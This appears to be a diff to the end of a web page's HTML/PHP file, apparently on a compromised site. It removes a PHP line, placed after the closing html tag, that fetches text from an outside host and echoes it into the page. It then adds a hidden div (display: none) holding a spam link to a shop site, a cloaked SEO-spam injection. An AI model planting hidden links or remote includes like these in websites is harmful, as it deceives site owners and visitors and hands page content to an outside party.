@@ -2736,4 +2736,6 @@
     </div>
 </body>
 </html>
-  <?php echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt"); ?>
+<div style="display: none;">
+<p><a href="https://www.tokofishitmurah.id/">gift item fish it</a></p>
+</div>
